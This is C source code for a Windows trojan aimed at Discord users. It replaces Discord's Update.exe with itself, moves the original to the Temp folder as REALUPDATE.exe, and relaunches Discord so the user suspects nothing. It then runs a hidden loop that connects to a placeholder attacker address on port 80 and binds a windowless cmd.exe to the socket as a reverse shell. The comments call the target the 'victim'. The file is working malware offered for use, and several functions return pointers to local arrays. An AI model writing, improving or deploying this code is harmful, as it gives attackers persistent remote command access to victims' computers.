#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

BOOL FileExists(LPCTSTR);
WCHAR* GetAppVer();
WCHAR* GetLocalPath();
WCHAR* GetDiscordPath();
WCHAR* GetTargetPath();
WCHAR* GetTempFolder();
void SetUp();
void CreateShell();

int WINAPI WinMain(HINSTANCE hinst, HINSTANCE previnst, LPSTR lpszArgs, int Mode) {
    SetUp();

    CreateShell();
    
    return 0;
}

BOOL FileExists(LPCTSTR path) {
	DWORD dwAttrib = GetFileAttributes(path);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

WCHAR* GetAppVer() { //get discord version number folder
    HANDLE hFind;
    WIN32_FIND_DATA data;
    WCHAR versionNum[MAX_PATH * sizeof(WCHAR)];

    wcscpy(versionNum, GetLocalPath());

    wcscat(versionNum, L"Discord\\app-*");

    hFind = FindFirstFileW(versionNum, &data);

    if (hFind != INVALID_HANDLE_VALUE) {
        wcscpy(versionNum, data.cFileName);
        FindClose(hFind);
        return &versionNum;
    }
    MessageBox(0, L"Discord/App folder not found", L"Message", MB_OK);
    exit(0);
}

WCHAR* GetLocalPath() { //get appdata local directory
    WCHAR path[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
    WCHAR username[MAX_PATH * sizeof(WCHAR)];
    DWORD length = MAX_PATH * sizeof(WCHAR);

    if (!GetUserNameW(username, &length)) {
        exit(0);
    }

    wcscat(username, L"\\AppData\\Local\\");

    wcscat(path, username);

    return path;

}

WCHAR* GetDiscordPath() { //get path to discord.exe
    WCHAR path[MAX_PATH * sizeof(WCHAR)];

    wcscpy(path, GetLocalPath());
    wcscat(path, L"Discord\\");
    wcscat(path, GetAppVer());
    wcscat(path, L"\\Discord.exe");

    return path;
}

WCHAR* GetTargetPath() { //get path to update.exe
    WCHAR path[MAX_PATH * sizeof(WCHAR)];

    wcscpy(path, GetLocalPath());
    wcscat(path, L"Discord\\Update.exe");

    return path;
}

WCHAR* GetTempFolder() { //get folder to place original update.exe in
    WCHAR path[MAX_PATH * sizeof(WCHAR)];

    wcscpy(path, GetLocalPath());
    wcscat(path, L"Temp\\REALUPDATE.exe");

    return path;

}

void SetUp() {
    WCHAR targetPath[MAX_PATH * sizeof(WCHAR)];
    WCHAR discordPath[MAX_PATH * sizeof(WCHAR)];
    WCHAR tempPath[MAX_PATH * sizeof(WCHAR)];
    WCHAR currentPath[MAX_PATH * sizeof(WCHAR)];

    wcscpy(targetPath, GetTargetPath());
    wcscpy(discordPath, GetDiscordPath());
    wcscpy(tempPath, GetTempFolder());

    //if program has already been run, it places update.exe to the temp folder.
    //to avoid overwriting the program again, it first checks the temp folder for "REALUPDATE.exe"

    if (!FileExists(tempPath)) { 
        if (!CopyFile(targetPath, tempPath, FALSE)) {
            exit(0);
        }

        GetModuleFileNameW(NULL, currentPath, sizeof(currentPath));

        if (!CopyFile(currentPath, targetPath, FALSE)) { //if program can't overwrite update.exe, exit program
            exit(0);
        }
    }

    //set up for CreateProcess()
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(discordPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) { //if discord.exe can't be opened, exit program
        exit(0);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void CreateShell() {
    while (TRUE) {
    start:
        Sleep(5000); //if program fails to connect, try again in 5 seconds

        SOCKET shell;
        struct sockaddr_in shellAddr;
        WSADATA wsa;

        if (WSAStartup(MAKEWORD(2, 2), &wsa)) {
            WSACleanup();
            goto start;
        }

        //ip and port victim connects to
        char addr[] = "xxx.xxx.xx.x";
        DWORD port = 80;

        shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

        shellAddr.sin_port = htons(port);
        shellAddr.sin_family = AF_INET;
        shellAddr.sin_addr.s_addr = inet_addr(addr);

        DWORD connection;

        connection = WSAConnect(shell, (SOCKADDR*)&shellAddr, sizeof(shellAddr), NULL, NULL, NULL, NULL); //attempt to connect

        if (connection == SOCKET_ERROR) { //if WSAConnect fails, close socket, clean up, and jump to start of loop
            closesocket(shell);
            WSACleanup();
            goto start;
        }
    
        char recvBuffer[512];
        memset(recvBuffer, 0, sizeof(recvBuffer));

        recv(shell, recvBuffer, sizeof(recvBuffer), 0);

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        memset(&si, 0, sizeof(si));
        memset(&pi, 0, sizeof(pi));

        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = (HANDLE)shell; 
        si.hStdInput = (HANDLE)shell; 
        si.hStdError = (HANDLE)shell;

        if (!CreateProcessW(TEXT("C:\\Windows\\System32\\cmd.exe"), NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            closesocket(shell);
            WSACleanup();
            goto start;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
